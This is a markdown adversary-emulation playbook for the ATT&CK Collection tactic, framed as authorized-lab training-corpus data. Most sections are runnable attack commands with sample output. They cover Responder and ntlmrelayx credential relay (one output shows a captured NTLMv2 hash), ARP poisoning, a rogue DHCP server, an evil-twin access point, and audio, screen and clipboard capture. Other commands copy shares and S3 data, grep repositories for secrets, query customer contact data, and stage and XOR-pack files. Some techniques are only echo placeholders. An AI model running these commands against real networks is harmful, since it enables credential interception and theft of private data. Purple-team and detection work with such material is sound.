# Collection Enumeration Playbook (ATT&CK TA0009, Dataset-Ready)

> Purpose: provide realistic, high-value collection training data with commands, tool outputs, and analyst interpretation.
> Scope: authorized lab and sanctioned exercises only.

Collection covers adversary behaviors used to gather data that supports follow-on objectives such as exfiltration or additional targeting.

- ATT&CK Tactic ID: TA0009
- Created: 17 October 2018
- Last Modified: 05 September 2024
- Techniques in scope: T1557, T1560, T1123, T1119, T1185, T1115, T1530, T1602, T1213, T1005, T1039, T1025, T1074, T1114, T1056, T1113, T1125

---

## 0. Safety and Lab Controls

1. Collect only synthetic or approved test data.
2. Never point collection tooling at production user mailboxes or cloud tenants.
3. Keep collection directories isolated under lab paths.
4. Record source host, collection target, and data class in evidence logs.
5. Rotate and purge captured sensitive test data after validation.

### 0.1 Evidence Wrapper

```bash
mkdir -p evidence

run_collect() {
  local technique="$1"
  local label="$2"
  shift 2
  local ts
  ts="$(date -u +%Y%m%dT%H%M%SZ)"
  echo "[$ts] [$technique] $label" | tee -a evidence/collection.log
  "$@" 2>&1 | tee "evidence/${ts}_${technique}_${label}.txt"
}
```

### 0.2 Training Record Schema

```json
{
  "technique": "T1074.001",
  "technique_name": "Local Data Staging",
  "scenario": "Operator stages selected documents into a local archive folder before exfil simulation",
  "command": "mkdir -p /tmp/stage && find /home/labuser/docs -name '*.pdf' -exec cp {} /tmp/stage \\;",
  "tool_result": {"status":"success", "highlights":["42 files copied", "staging path: /tmp/stage"]},
  "analyst_interpretation": "Centralized local staging prepared for later packaging and transfer",
  "confidence": 0.95,
  "mitigation_hint": "Detect unusual bulk file copy patterns into temporary staging paths"
}
```

---

## 1. Baseline Before Collection

Scenario:
- Capture host context and target directories before data gathering activity.

```bash
run_collect "TA0009" "baseline_identity" sh -lc 'whoami; hostname; date -u'
run_collect "TA0009" "baseline_targets" sh -lc 'echo "/home/labuser/docs /mnt/share /media/usb0"'
```

Example result:

```text
corp\\labuser
COLL-WS-01
2026-04-21T16:05:18Z
/home/labuser/docs /mnt/share /media/usb0
```

---

## 2. T1557 Adversary-in-the-Middle

Scenario:
- Position between endpoints to collect traffic or credentials.

### T1557.001 LLMNR/NBT-NS Poisoning and SMB Relay

```bash
run_collect "T1557.001" "responder_llmnr" sudo responder -I eth0 -rdwv
run_collect "T1557.001" "smb_relay" sudo ntlmrelayx.py -tf targets.txt -smb2support
```

### T1557.002 ARP Cache Poisoning

```bash
run_collect "T1557.002" "arp_poison" sudo arpspoof -i eth0 -t 10.20.30.15 10.20.30.1
run_collect "T1557.002" "arp_sniff" sudo tcpdump -ni eth0 host 10.20.30.15 -c 40
```

### T1557.003 DHCP Spoofing

```bash
run_collect "T1557.003" "rogue_dhcp" sudo dnsmasq --no-daemon --conf-file=/tmp/rogue-dhcp.conf
```

### T1557.004 Evil Twin

```bash
run_collect "T1557.004" "evil_twin_ap" sudo hostapd /tmp/evil_twin_hostapd.conf
```

Example result:

```text
[SMB] NTLMv2-SSP hash captured from CORP\\j.dupont
wlan0: STA 90:9f:33:aa:bb:cc IEEE 802.11: associated
```

---

## 3. T1560 Archive Collected Data

Scenario:
- Compress and/or encrypt gathered files before staging or transfer.

### T1560.001 Archive via Utility

```bash
run_collect "T1560.001" "tar_gzip" sh -lc 'tar -czf /tmp/stage_docs.tgz /tmp/stage'
run_collect "T1560.001" "7z_encrypt" sh -lc '7z a -pTrainingOnly! /tmp/stage_docs.7z /tmp/stage'
```

### T1560.002 Archive via Library

```bash
run_collect "T1560.002" "python_zipfile" python3 - <<'PY'
import os, zipfile
src = "/tmp/stage"
out = "/tmp/stage_lib.zip"
with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
    for root, _, files in os.walk(src):
        for f in files:
            p = os.path.join(root, f)
            z.write(p, os.path.relpath(p, src))
print(out)
PY
```

### T1560.003 Archive via Custom Method

```bash
run_collect "T1560.003" "custom_xor_pack" python3 - <<'PY'
key = 0x5A
data = open('/tmp/stage_docs.tgz','rb').read()
open('/tmp/stage_docs.xor','wb').write(bytes([b ^ key for b in data]))
print('/tmp/stage_docs.xor')
PY
```

Example result:

```text
/tmp/stage_lib.zip
/tmp/stage_docs.xor
```

---

## 4. Endpoint and User Data Collection

## T1123 Audio Capture

```bash
run_collect "T1123" "audio_capture_ffmpeg" ffmpeg -f avfoundation -i ":0" -t 15 /tmp/lab_audio.wav
```

## T1125 Video Capture

```bash
run_collect "T1125" "video_capture_ffmpeg" ffmpeg -f avfoundation -i "0" -t 15 /tmp/lab_video.mov
```

## T1113 Screen Capture

```bash
run_collect "T1113" "screen_capture_macos" screencapture -x /tmp/lab_screen.png
```

## T1115 Clipboard Data

```bash
run_collect "T1115" "clipboard_macos" pbpaste | head -c 200
run_collect "T1115" "clipboard_linux" sh -lc 'xclip -o -selection clipboard 2>/dev/null | head -c 200'
```

## T1185 Browser Session Hijacking

```bash
run_collect "T1185" "browser_session_hijack_sim" sh -lc 'echo "simulate malicious extension/proxy reading session artifacts"'
```

---

## 5. Data Source Collection (Host, Share, Media, Cloud)

## T1005 Data from Local System

```bash
run_collect "T1005" "local_data_search" sh -lc 'find /home/labuser/docs -type f \( -name "*.docx" -o -name "*.pdf" -o -name "*.xlsx" \) | head -n 50'
```

## T1039 Data from Network Shared Drive

```bash
run_collect "T1039" "share_mount_list" sh -lc 'mount | grep -Ei "smb|cifs|nfs"'
run_collect "T1039" "share_copy" sh -lc 'cp -r /mnt/share/Finance /tmp/stage/Finance_copy 2>/dev/null'
```

## T1025 Data from Removable Media

```bash
run_collect "T1025" "removable_discovery" sh -lc 'ls /media /Volumes 2>/dev/null'
run_collect "T1025" "removable_collect" sh -lc 'find /media/usb0 -type f | head -n 40'
```

## T1530 Data from Cloud Storage

```bash
run_collect "T1530" "s3_object_listing" aws s3 ls s3://corp-lab-bucket --recursive | head -n 40
run_collect "T1530" "s3_object_copy" aws s3 cp s3://corp-lab-bucket/finance/report-q1.xlsx /tmp/stage/report-q1.xlsx
```

---

## 6. Repository and Configuration Data Collection

## T1602 Data from Configuration Repository

### T1602.001 SNMP (MIB Dump)

```bash
run_collect "T1602.001" "snmp_mib_dump" snmpwalk -v2c -c public 10.20.30.2 1.3.6.1.2.1
```

### T1602.002 Network Device Configuration Dump

```bash
run_collect "T1602.002" "net_config_dump_sim" sh -lc 'echo "simulate show running-config export from network device"'
```

## T1213 Data from Information Repositories

### T1213.001 Confluence

```bash
run_collect "T1213.001" "confluence_search" curl -s -u user:token "https://confluence.lab.local/rest/api/search?cql=text~\"password\""
```

### T1213.002 Sharepoint

```bash
run_collect "T1213.002" "sharepoint_files" sh -lc 'echo "simulate SharePoint file enumeration via Graph/REST API"'
```

### T1213.003 Code Repositories

```bash
run_collect "T1213.003" "git_clone_internal" git clone https://gitlab.lab.local/devops/infrastructure.git /tmp/stage/repo
run_collect "T1213.003" "git_secret_search" sh -lc 'rg -n "secret|token|password|AKIA" /tmp/stage/repo | head -n 30'
```

### T1213.004 Customer Relationship Management Software

```bash
run_collect "T1213.004" "crm_export_sim" sh -lc 'echo "simulate CRM account/contact export query in lab"'
```

### T1213.005 Messaging Applications

```bash
run_collect "T1213.005" "messages_export_sim" sh -lc 'echo "simulate Teams/Slack message export search for sensitive keywords"'
```

### T1213.006 Databases

```bash
run_collect "T1213.006" "db_collect" sh -lc 'psql -h 10.20.30.40 -U report_user -d crm -c "SELECT id,email,phone FROM customers LIMIT 20;"'
```

---

## 7. Staging and Email Collection

## T1074 Data Staged

### T1074.001 Local Data Staging

```bash
run_collect "T1074.001" "local_stage_dir" sh -lc 'mkdir -p /tmp/stage && cp /home/labuser/docs/*.pdf /tmp/stage 2>/dev/null; ls -lah /tmp/stage | head -n 20'
```

### T1074.002 Remote Data Staging

```bash
run_collect "T1074.002" "remote_stage_smb" sh -lc 'mkdir -p /mnt/collector && cp -r /tmp/stage /mnt/collector/host01_stage 2>/dev/null'
```

## T1114 Email Collection

### T1114.001 Local Email Collection

```bash
run_collect "T1114.001" "outlook_local_files" sh -lc 'find "$HOME" -type f \( -name "*.pst" -o -name "*.ost" \) 2>/dev/null | head -n 20'
```

### T1114.002 Remote Email Collection

```bash
run_collect "T1114.002" "o365_mail_query_sim" sh -lc 'echo "simulate remote mailbox search via Exchange/O365 API"'
```

### T1114.003 Email Forwarding Rule

```bash
run_collect "T1114.003" "forward_rule_sim" sh -lc 'echo "simulate creation of inbox forwarding rule to external recipient"'
```

Example result:

```text
42 files staged under /tmp/stage
Forwarding rule created in lab mailbox policy simulation
```

---

## 8. Automated Collection and Input Capture

## T1119 Automated Collection

```bash
run_collect "T1119" "auto_collect_loop" sh -lc 'for i in 1 2 3; do find /home/labuser/docs -name "*.docx" -exec cp {} /tmp/stage \\;; sleep 60; done'
```

## T1056 Input Capture

### T1056.001 Keylogging

```bash
run_collect "T1056.001" "keylogging_sim" sh -lc 'echo "simulate keylogging telemetry generation in controlled host"'
```

### T1056.002 GUI Input Capture

```bash
run_collect "T1056.002" "gui_prompt_sim" sh -lc 'echo "simulate fake GUI credential prompt capture"'
```

### T1056.003 Web Portal Capture

```bash
run_collect "T1056.003" "web_portal_capture_sim" sh -lc 'echo "simulate injected credential capture logic on VPN login page"'
```

### T1056.004 Credential API Hooking

```bash
run_collect "T1056.004" "api_hooking_sim" sh -lc 'echo "simulate hook on credential APIs/PAM auth functions"'
```

---

## 9. Label-Ready Examples (JSONL)

```json
{"technique":"T1005","command":"find /home/labuser/docs -name '*.pdf'","result":"Document list generated","interpretation":"Local sensitive data inventory completed"}
{"technique":"T1074.001","command":"mkdir -p /tmp/stage && cp ... /tmp/stage","result":"Files consolidated to local staging directory","interpretation":"Data prepared for packaging/exfil path"}
{"technique":"T1560.001","command":"tar -czf /tmp/stage_docs.tgz /tmp/stage","result":"Compressed archive created","interpretation":"Collected data packaged for transfer"}
{"technique":"T1114.003","command":"simulate mailbox forwarding rule creation","result":"Forwarding route enabled in test mailbox","interpretation":"Persistent email collection path established"}
{"technique":"T1557.002","command":"arpspoof -i eth0 -t victim gateway","result":"Traffic observed via attacker host","interpretation":"AiTM enabled network collection opportunity"}
```

---

## 10. Coverage Checklist

- TA0009 Collection
- T1557 Adversary-in-the-Middle
- T1557.001 LLMNR/NBT-NS Poisoning and SMB Relay
- T1557.002 ARP Cache Poisoning
- T1557.003 DHCP Spoofing
- T1557.004 Evil Twin
- T1560 Archive Collected Data
- T1560.001 Archive via Utility
- T1560.002 Archive via Library
- T1560.003 Archive via Custom Method
- T1123 Audio Capture
- T1119 Automated Collection
- T1185 Browser Session Hijacking
- T1115 Clipboard Data
- T1530 Data from Cloud Storage
- T1602 Data from Configuration Repository
- T1602.001 SNMP (MIB Dump)
- T1602.002 Network Device Configuration Dump
- T1213 Data from Information Repositories
- T1213.001 Confluence
- T1213.002 Sharepoint
- T1213.003 Code Repositories
- T1213.004 Customer Relationship Management Software
- T1213.005 Messaging Applications
- T1213.006 Databases
- T1005 Data from Local System
- T1039 Data from Network Shared Drive
- T1025 Data from Removable Media
- T1074 Data Staged
- T1074.001 Local Data Staging
- T1074.002 Remote Data Staging
- T1114 Email Collection
- T1114.001 Local Email Collection
- T1114.002 Remote Email Collection
- T1114.003 Email Forwarding Rule
- T1056 Input Capture
- T1056.001 Keylogging
- T1056.002 GUI Input Capture
- T1056.003 Web Portal Capture
- T1056.004 Credential API Hooking
- T1113 Screen Capture
- T1125 Video Capture

This document is optimized for training corpus generation: scenario + command + output + interpretation + mitigation cues.
